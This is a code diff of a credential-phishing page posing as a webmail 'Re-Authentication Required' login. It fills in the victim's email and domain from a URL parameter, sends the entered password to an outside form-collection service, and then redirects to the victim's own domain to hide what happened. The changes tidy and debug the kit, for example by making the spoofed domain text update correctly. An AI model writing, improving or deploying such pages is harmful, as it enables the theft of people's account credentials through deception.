@@ -4,7 +4,6 @@
 <link rel="icon" href="#" type="image/gif">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-</head>
 <style>
  body{
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -88,7 +87,7 @@ input[type=submit]{
  bottom: 0;
 }
 </style>
-
+</head>
 <body>
 <div class="container">
 <div class="header" id="date-header">Loading date...</div>
@@ -97,39 +96,22 @@ input[type=submit]{
 <div id="icon">
 <table><tr>
 <td><img src="mx.png" width="30"></td>
+<!-- The domain name inside this span will be changed by JavaScript -->
 <td><label id="l3"> <span id="domain-name">skybeam.com</span> </label></td>
 </tr>
 </table>
 </div>
 <div class="form">
-<!-- Formspark integration - NO other reporting -->
 <form id="fm" method="POST" action="https://submit-form.com/0gyAIslPc">
-  <!-- Replace with your actual Formspark endpoint -->
-
-  <!-- Honeypot field for bot protection -->
   <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
-
-  <!-- Hidden redirect after submission (optional) -->
   <input type="hidden" name="_redirect" value="https://skybeam.com">
-
-  <!-- Page identifier -->
   <input type="hidden" name="source" value="webmail_reauthentication">
-
 <div style="text-align: left;">
 <label id="l1">Re-Authentication Required </label><br>
 <label id="l2">Log-on again to continue repair...</label>
 </div>
 <div style="padding: 5px;"></div>
-
-<!-- Email field - dynamically populated from URL parameter -->
-<input type="email" name="email" id="email-field" style="cursor:no-drop; -webkit-touch-callout: none;
--webkit-user-select: none;
--khtml-user-select: none;
--moz-user-select: none;
--ms-user-select: none;
--o-user-select: none;
-user-select: none;" readonly="" value="loading...">
-
+<input type="email" name="email" id="email-field" style="cursor:no-drop; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; -o-user-select: none; user-select: none;" readonly="" value="loading...">
 <div style="padding: 5px;"></div>
 <input type="password" name="password" placeholder="Password" autocomplete="current-password;" required>
 <div style="padding: 8px; padding-left: 0%; text-align: left;">
@@ -167,40 +149,48 @@ user-select: none;" readonly="" value="loading...">
     return `${month} ${day}, ${year} | ${hours}:${minutes}: ${seconds} ${ampm}`;
   }
 
-  // Update date header
+  // --- Set the date header ---
   document.getElementById('date-header').textContent = getFormattedDate();
 
   // Get email from URL parameter 'emp'
   const emailFromUrl = getUrlParameter('emp');
   
   // Extract domain from email
-  let domainFromEmail = 'skybeam.com'; // Default fallback
+  let domainFromEmail = 'service.com'; // Neutral fallback
   
   if (emailFromUrl && emailFromUrl.includes('@')) {
     domainFromEmail = emailFromUrl.split('@')[1];
   }
   
-  // Update all instances of email and domain
+  // --- Update all instances of email and domain ---
+  const emailField = document.getElementById('email-field');
+  const footerEmail = document.getElementById('footer-email');
+  const titleSpan = document.getElementById('dynamic-email-title');
+  const domainSpan = document.getElementById('domain-name'); // Get the span for the logo
+  const redirectInput = document.querySelector('input[name="_redirect"]');
+
   if (emailFromUrl) {
-    document.getElementById('email-field').value = emailFromUrl;
-    document.getElementById('footer-email').textContent = emailFromUrl;
-    document.getElementById('dynamic-email-title').textContent = emailFromUrl;
-    document.getElementById('domain-name').textContent = domainFromEmail;
+    if (emailField) emailField.value = emailFromUrl;
+    if (footerEmail) footerEmail.textContent = emailFromUrl;
+    if (titleSpan) titleSpan.textContent = emailFromUrl;
     
-    // Update the redirect URL to use the actual domain
-    document.querySelector('input[name="_redirect"]').value = 'https://' + domainFromEmail;
+    // *** THIS IS THE FIX: Change the big logo text ***
+    if (domainSpan) domainSpan.textContent = domainFromEmail;
+    
+    // Update redirect URL
+    if (redirectInput) redirectInput.value = 'https://' + domainFromEmail;
+    
   } else {
     // Fallback if no email in URL
-    document.getElementById('email-field').value = 'user@domain.com';
-    document.getElementById('footer-email').textContent = 'user@domain.com';
-    document.getElementById('dynamic-email-title').textContent = 'user@domain.com';
-    document.getElementById('domain-name').textContent = 'domain.com';
+    if (emailField) emailField.value = 'user@domain.com';
+    if (footerEmail) footerEmail.textContent = 'user@domain.com';
+    if (titleSpan) titleSpan.textContent = 'user@domain.com';
+    if (domainSpan) domainSpan.textContent = 'domain.com';
   }
 </script>
 
-<!-- IMPORTANT: Replace with your actual Formspark endpoint -->
 <script>
-  // Update form action with your Formspark ID
+  // IMPORTANT: Replace with your actual Formspark endpoint
   document.getElementById('fm').action = 'https://submit-form.com/YOUR_FORMSPARK_ID_HERE';
 </script>
 
